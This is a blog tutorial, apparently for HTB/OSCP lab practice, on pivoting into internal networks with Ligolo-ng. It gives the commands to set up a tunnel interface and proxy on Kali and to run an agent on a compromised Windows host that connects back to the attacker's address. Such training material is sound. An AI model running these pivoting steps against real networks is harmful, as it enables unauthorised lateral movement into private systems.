---
layout: post
title:  "Pivoting with Ligolo-ng - Part 3"
author: nanobyte
date:   2023-06-26
description: Part 3 of my pivoting basics, and how to use Ligolo-ng
tags: HTB OSCP Pivoting
---

[Part 1](https://nanobytesecurity.com/2023/06/26/pivoting-basics-part1.html), pivoting introduction and using SSHuttle\
[Part 2](https://nanobytesecurity.com/2023/06/26/chisel-pivoting-part2.html), pivoting with Chisel\
[Part 3](https://nanobytesecurity.com/2023/06/26/ligolo-pivoting-part3.html), pivoting with Ligolo-ng

<h3>Pivoting with Ligolo-ng - Part 3</h3>

In the final part of my pivoting basics, I will cover Ligolo-ng. I will continue this guide from Part 1. Part 1 dove into what pivoting was, and how to pivot with SSHuttle. In this post, I will continue from where we left off. As a reminder, here is our scenario:

+ Kali Linux (Attacking Machine): 10.10.15.100
+ First Pivot Machine (Public IP): 10.10.110.10
+ First Network: 172.18.1.0/24
+ Second Network: 172.18.2.0/24
+ Second Pivot Machine: 172.18.2.15
+ Third Network: 172.18.3.0/24
+ Third Pivot Machine: 172.18.3.20

We are picking up from where Part 1 left off, with an established SSHuttle session to 172.18.1.0/24. At this point, I will assume you have comrpomised DC01, and have discovered 172.18.2.0/24, with DC02:

<img src="/images/posts/pivoting/Pivoting_Part2_Initial.PNG" alt="pivoting-part2-initial" width="700"/>

<h3>Ligolo Proxy</h3>

First, you will need Ligolo-ng. Head to the GitHub, and download Ligolo from Releases for the architecrture of the victim, and for your Kali. I will assume that the victim is Windows. [Here is the GitHub for Chisel.](https://github.com/nicocha30/ligolo-ng)

Similar to Chisel's server, Ligolo uses a Proxy that runs on our Kali machine. Unlike Chisel, we will not use proxychains at all, and instead add a new interface to our machine, and add routes through this interface for our target networks. First, we must create our new tunnel interface, bring the interface up, and add our route:

{% highlight bash linenos %}
# Create our new interface
sudo ip tuntap add user [username] mode tun ligolo

# Bring the interface up
sudo ip link set ligolo up

# Add a route to the new tunnel
# NOTE this is where you insert the new subnet you want to access.
sudo ip route add 172.18.2.0/24 dev ligolo
{% endhighlight %}

At this point, we are now ready to spawn our proxy. We can launch our proxy with the following command:

{% highlight bash linenos %}
./proxy -selfcert
{% endhighlight %}

With the proxy running, we should see the following:

<img src="/images/posts/pivoting/ligolo-proxy-start.PNG" alt="pivoting-ligolo-proxy" width="550"/>

<h3>Ligolo Agent</h3>

Once we have our proxy listening on our Kali machine, we can run our ligolo-ng agent's to connect back to our Kali machine. To do this, transfer the agent to DC02. If you are unsure how to complete this, there are ways I covered in Part 2, using python's http.server and impacket-smbserver. Once the agent is on the victim, we can run the agent to connect:

{% highlight bash linenos %}
./agent.exe -connect 10.10.15.100:11601 -ignore-cert
{% endhighlight %}

In the above command, we run the agent to connect back to our Kali machine on port 11601, which ligolo uses by default. Because our proxy used the -selfcert flag, we must use the -ignore-cert flag. We should sewe the following from our victim:

<img src="/images/posts/pivoting/ligolo-agent-start.PNG" alt="pivoting-ligolo-agent-run" width="550"/>

Once the command has run, looking at our server, we should see Agent joined:

<img src="/images/posts/pivoting/ligolo-proxy-agent1-joined.PNG" alt="pivoting-ligolo-agent-joinedl" width="550"/>

After the agent has joined, we can type 'session', and using the Enter key, select our session:

<img src="/images/posts/pivoting/ligolo-proxy-agent1-session.PNG" alt="pivoting-ligolo-session" width="550"/>

Once selected, we can start our proxy by typing 'start':

<img src="/images/posts/pivoting/ligolo-proxy-agent1-start.PNG" alt="pivoting-ligolo-start" width="550"/>

